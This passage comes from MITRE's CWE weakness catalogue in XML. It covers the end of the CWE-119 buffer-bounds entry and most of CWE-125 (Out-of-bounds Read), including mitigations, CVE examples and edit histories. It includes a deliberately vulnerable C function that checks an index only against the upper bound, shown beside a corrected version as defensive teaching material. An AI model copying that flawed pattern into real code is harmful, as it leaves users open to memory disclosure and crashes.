	    <Reference External_Reference_ID="REF-1337" Section="Memory information leaks"/>
         </References>
         <Mapping_Notes>
            <Usage>Discouraged</Usage>
            <Rationale>CWE-119 is commonly misused in low-information vulnerability reports when lower-level CWEs could be used instead, or when more details about the vulnerability are available.</Rationale>
            <Comments>Look at CWE-119's children and consider mapping to CWEs such as CWE-787: Out-of-bounds Write, CWE-125: Out-of-bounds Read, or others.</Comments>
            <Reasons>
               <Reason Type="Frequent Misuse"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Applicable Platform">
               <xhtml:p>It is possible in any programming languages without memory management support to attempt an operation outside of the bounds of a memory buffer, but the consequences will vary widely depending on the language, platform, and chip architecture.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Likelihood_of_Exploit, Name, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Relationships, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Detection_Factors, Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Demonstrative_Examples, Detection_Factors, Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Observed_Examples, Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, References, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Buffer Errors</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-01-12">Failure to Constrain Operations within the Bounds of an Allocated Memory Buffer</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-12-13">Failure to Constrain Operations within the Bounds of a Memory Buffer</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="125" Name="Out-of-bounds Read" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product reads data past the end, or before the beginning, of the intended buffer.</Description>
         <Extended_Description>Typically, this can allow attackers to read sensitive information from other memory locations or cause a crash.  A crash can occur when the code reads a variable amount of data and assumes that a sentinel exists to stop the read operation, such as a NUL in a string.  The expected sentinel might not be located in the out-of-bounds memory, causing excessive data to be read, leading to a segmentation fault or a buffer overflow.  The product may modify an index or perform pointer arithmetic that references a memory location that is outside of the boundaries of the buffer.  A subsequent read operation then produces undefined or unexpected results.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="119" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="119" View_ID="1003" Ordinal="Primary"/>
             <Related_Weakness Nature="ChildOf" CWE_ID="119" View_ID="1305" Ordinal="Primary"/>
			 <Related_Weakness Nature="ChildOf" CWE_ID="119" View_ID="1340" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Name="C" Prevalence="Undetermined"/>
            <Language Name="C++" Prevalence="Undetermined"/>
            <Technology Class="ICS/OT" Prevalence="Often"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Memory</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
	       <Note>By reading out-of-bounds memory, an attacker might be able to get secret values, such as memory addresses, which can be bypass protection mechanisms such as ASLR in order to improve the reliability and likelihood of exploiting a separate weakness to achieve code execution instead of just denial of service.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
           <Detection_Method Detection_Method_ID="DM-13">
             <Method>Fuzzing</Method>
             <Description>Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>To reduce the likelihood of introducing an out-of-bounds read, ensure that you validate and ensure correct calculations for any length argument, buffer size calculation, or offset. Be especially careful of relying on a sentinel (i.e. special character such as NUL) in untrusted inputs.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Strategy>Language Selection</Strategy>
               <Description>Use a language that provides appropriate memory abstractions.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-100">
               <Intro_Text>In the following code, the method retrieves a value from an array at a specific array index location that is given as an input parameter to the method</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>int getValueFromArray(int *array, int len, int index) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>int value;<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>// check that the array index is less than the maximum</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>// length of the array</xhtml:i>
                           <xhtml:br/>if (index &lt; len) {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>
                                 <xhtml:br/>
                                 <xhtml:i>// get the value at the specified index of the array</xhtml:i>
                                 <xhtml:br/>value = array[index];</xhtml:div>
                           </xhtml:div>}<xhtml:br/>
                           <xhtml:i>// if array index is invalid then output error message</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>// and return value indicating error</xhtml:i>
                           <xhtml:br/>else {<xhtml:div style="margin-left:1em;">printf("Value is: %d\n", array[index]);<xhtml:br/>value = -1;</xhtml:div>}<xhtml:br/>
                           <xhtml:br/>return value;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>However, this method only verifies that the given array index is less than the maximum length of the array but does not check for the minimum value (CWE-839). This will allow a negative value to be accepted as the input array index, which will result in a out of bounds read (CWE-125) and may allow access to sensitive memory. The input array index should be checked to verify that is within the maximum and minimum range required for the array (CWE-129). In this example the if statement should be modified to include a minimum range check, as shown below.</Body_Text>
               <Example_Code Nature="Good" Language="C">
                  <xhtml:div>
                     <xhtml:br/>...<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// check that the array index is within the correct</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// range of values for the array</xhtml:i>
                     <xhtml:br/>if (index &gt;= 0 &amp;&amp; index &lt; len) {<xhtml:br/>
                     <xhtml:br/>...</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2020-11899</Reference>
               <Description>Out-of-bounds read in IP stack used in embedded systems, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-11899</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2014-0160</Reference>
               <Description>Chain: "Heartbleed" bug receives an inconsistent length parameter (CWE-130) enabling an out-of-bounds read (CWE-126), returning memory that could include private cryptographic keys and other sensitive data.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2014-0160</Link>
            </Observed_Example>
			<Observed_Example>
			  <Reference>CVE-2021-40985</Reference>
			  <Description>HTML conversion package has a buffer under-read, allowing a crash</Description>
			  <Link>https://www.cve.org/CVERecord?id=CVE-2021-40985</Link>
			</Observed_Example>
            <Observed_Example>
               <Reference>CVE-2018-10887</Reference>
               <Description>Chain: unexpected sign extension (CWE-194) leads to integer overflow (CWE-190), causing an out-of-bounds read (CWE-125)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2018-10887</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2523</Reference>
               <Description>Chain: product does not handle when an input string is not NULL terminated (CWE-170), leading to buffer over-read (CWE-125) or heap-based buffer overflow (CWE-122).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2523</Link>
            </Observed_Example>
	    <Observed_Example>
	      <Reference>CVE-2018-16069</Reference>
	      <Description>Chain: series of floating-point precision errors
	      (CWE-1339) in a web browser rendering engine causes out-of-bounds read
	      (CWE-125), giving access to cross-origin data</Description>
	      <Link>https://www.cve.org/CVERecord?id=CVE-2018-16069</Link>
	    </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0112</Reference>
               <Description>out-of-bounds read due to improper length check</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0112</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0183</Reference>
               <Description>packet with large number of specified elements cause out-of-bounds read.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0183</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0221</Reference>
               <Description>packet with large number of specified elements cause out-of-bounds read.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0221</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0184</Reference>
               <Description>out-of-bounds read, resultant from integer underflow</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0184</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1940</Reference>
               <Description>large length value causes out-of-bounds read</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1940</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0421</Reference>
               <Description>malformed image causes out-of-bounds read</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0421</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4113</Reference>
               <Description>OS kernel trusts userland-supplied length value, allowing reading of sensitive information</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4113</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Out-of-bounds Read</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ARR30-C</Entry_ID>
               <Entry_Name>Do not form or use out-of-bounds pointers or array subscripts</Entry_Name>
               <Mapping_Fit>Imprecise</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ARR38-C</Entry_ID>
               <Entry_Name>Guarantee that library functions do not form invalid pointers</Entry_Name>
               <Mapping_Fit>Imprecise</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>EXP39-C</Entry_ID>
               <Entry_Name>Do not access a variable through a pointer of an incompatible type</Entry_Name>
               <Mapping_Fit>Imprecise</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>STR31-C</Entry_ID>
               <Entry_Name>Guarantee that storage for strings has sufficient space for character data and the null terminator</Entry_Name>
               <Mapping_Fit>Imprecise</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>STR32-C</Entry_ID>
               <Entry_Name>Do not pass a non-null-terminated character sequence to a library function that expects a string</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP8</Entry_ID>
               <Entry_Name>Faulty Buffer Access</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="540"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-1034"/>
            <Reference External_Reference_ID="REF-1035"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 5: Buffer Overruns.&#34; Page 89"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Relationships, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Causal_Nature, Observed_Examples, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Description, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Common_Consequences, Observed_Examples, Potential_Mitigations, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Research_Gaps</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Detection_Factors, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
